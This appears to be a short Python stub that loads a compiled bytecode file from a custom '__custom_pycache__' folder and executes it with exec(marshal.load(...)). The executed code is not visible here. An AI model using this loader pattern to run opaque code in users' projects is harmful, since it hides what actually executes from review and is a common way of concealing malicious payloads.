
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'DataBank_7daee71f0513484b9ba4e98d937fd9ce.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
